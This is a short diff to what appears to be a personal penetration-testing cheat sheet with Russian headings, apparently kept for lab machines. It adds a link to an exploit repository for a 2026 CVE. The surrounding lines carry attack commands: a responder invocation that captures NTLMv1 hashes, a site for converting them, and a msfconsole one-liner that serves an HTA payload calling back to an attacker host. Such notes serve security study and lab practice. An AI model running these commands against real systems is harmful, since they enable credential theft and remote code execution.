@@ -1907,7 +1907,12 @@ rsync 10.129.228.37::public/flag.txt flag.txt
 
 		sudo responder -I eth0 --lm --disable-ess -v
 		https://ntlmv1.com/login.php (сайт который переводит netntlmv1 в NTLM hash)
-		
+
+# CVE 2026-54121
+
+		https://github.com/aniqfakhrul/CVE-2026-54121
+
+	
 # Произвольное выполнение файла
 
 	msfconsole -x "use exploit/windows/misc/hta_server; set LHOST 10.10.14.207; set LPORT 8443; set SRVHOST 10.10.14.207; run -j" 
